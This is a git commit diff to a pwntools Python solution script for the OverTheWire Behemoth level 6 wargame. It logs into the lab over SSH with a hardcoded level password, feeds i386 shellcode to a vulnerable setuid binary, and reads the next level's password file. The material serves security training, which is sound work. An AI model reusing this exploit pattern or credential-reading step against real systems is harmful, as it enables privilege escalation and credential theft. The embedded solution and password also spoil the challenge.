62479a949806cc15655ec6e10123bc61cf3e93f7
whatsyourask <lexeymartynov@gmail.com>
2021-03-30 13:13:21 -0400

    Fixed the exploit, it incorrectly wrote the shellcode to the shellcode.txt, so, I used python to write it to the file

--- OverTheWire/behemoth/behemoth6.py
+++ OverTheWire/behemoth/behemoth6.py
@@ -2,13 +2,16 @@ from pwn import *
 
 
 con = ssh('behemoth6', 'behemoth.labs.overthewire.org', password='mayiroeche', port=2221)
-context.arch = 'i386'
-shellcode = shellcraft.linux.echo('HelloKitty', 1)
+shellcode = shellcraft.i386.linux.echo(b'HelloKitty', 1)
+shellcode += shellcraft.i386.linux.exit(0)
+print(asm(shellcode))
 p = con.process('sh')
 p.sendline('cd /tmp && cd /tmp/behem6')
-p.sendline(b'echo "' + asm(shellcode) + b'" > shellcode.txt')
+p.sendline(b'python -c \'print "' +  asm(shellcode) + b'"\' > shellcode.txt')
 p.sendline('/behemoth/behemoth6')
-print(p.recv())
-print(p.recv())
-print(p.recv())
+p.recv()
+p.recv()
+p.recv()
+p.recv()
+p.sendline('cat /etc/behemoth_pass/behemoth7')
 print(p.recv())
